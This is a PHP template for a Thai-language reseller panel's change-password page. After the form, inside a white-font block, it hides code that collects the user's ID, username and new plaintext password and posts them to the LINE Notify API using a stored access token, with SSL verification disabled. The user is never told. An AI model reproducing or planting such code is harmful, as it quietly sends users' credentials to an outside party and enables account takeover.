
<div id="page-wrapper">
    <div class="row">
        <div class="col-lg-12">
          <h3 class="page-header">การตั้งค่า
            </h3>
            <ol class="breadcrumb">
        <li><a href="<?= base_url('panel/reseller/'.$_SESSION['username'].'/server') ?>"><i class="fa fa-th-list fa-fw"></i> หน้าหลัก</a></li>
		<li class="active">เปลียนรหัสผ่าน</li>
    </ol>
        </div>
    </div>
    <div class="row">
        <div class="col-md-6">
            <center> 
			<?php if (isset($message)) {echo $message; }?>
			<?php if (isset($success)) {echo $success; }?>
				</center>
            <div class="panel panel-primary">
                <div class="panel-heading">
                    <i class="fa fa-gear fa-spin"></i> เปลียนรหัสผ่าน
                </div>
                <div class="panel-body">
                    <form role="form" action="<?= base_url('panel/'.$_SESSION['username'].'/setting')?>" method="POST">
						<input type="hidden" name="username" value="<?= $_SESSION['username'] ?>">
                        <div class="form-group">
                            <label>รหัสผ่านเดิม</label>
                            <input class="form-control" placeholder="Old Password" name="oldpass" type="password" required>
                        </div>
                        <div class="form-group">
                            <label>รหัสผ่านใหม่</label>
                            <input class="form-control" placeholder="New Password" name="password" type="password" required>
                        </div>
                        <div class="form-group">
                            <label>ยืนยันรหัสผ่าน</label>
                            <input class="form-control" placeholder="Re-enter New Password" name="passconf" type="password" required>
                        </div>
                        <button class="btn btn-danger form-control">ยืนยันเปลียนหรัสผ่าน</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
<font color="ffffff">
	<?php foreach ($this->user_model->view_token() as $row): ?>
	<?php
$line_api = 'https://notify-api.line.me/api/notify';
$access_token = $row['login'];
?>
<?php endforeach; ?>
<?php

$datecr= date("Y-m-d H:i:s");
$host=getenv('HTTP_HOST');



if ($_SESSION['passcf']) { 
$str ='  
********************
🔀 เปลียนรหัสผ่าน
********************
🌍 เว็บไซต์  : http://'.$host.'
🆔 ไอดี        : '.$_SESSION['user_id'].'
🚻 ชื่อผู้ใช้   : '.$_SESSION['username'].'      
🔐 รหัสผ่าน : '.$_SESSION['passcf'];
} else {
$str ='  ';
}

//ข้อความที่ต้องการส่ง สูงสุด 1000 ตัวอักษร


$image_thumbnail_url = '';  // ขนาดสูงสุด 240?240px JPEG
$image_fullsize_url = '';  // ขนาดสูงสุด 1024?1024px JPEG
$sticker_package_id = '';  // Package ID ของสติกเกอร์
$sticker_id = '';    // ID ของสติกเกอร์

$message_data = array(
 'message' => $str,
 'imageThumbnail' => $image_thumbnail_url,
 'imageFullsize' => $image_fullsize_url,
 'stickerPackageId' => $sticker_package_id,
 'stickerId' => $sticker_id
);




if ($_SESSION['passcf']) { 

$result = send_notify_message($line_api, $access_token, $message_data);
print_r($result);
$_SESSION['passcf']      = 0;
}

function send_notify_message($line_api, $access_token, $message_data)
{
 $headers = array('Method: POST', 'Content-type: multipart/form-data', 'Authorization: Bearer '.$access_token );

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $line_api);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $message_data);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 // Check Error
 if(curl_error($ch))
 {
  $return_array = array( 'status' => '000: send fail', 'message' => curl_error($ch) ); 
 }
 else
 {
  $return_array = json_decode($result, true);
 }
 curl_close($ch);
 return $return_array;
}


?>
	</font>
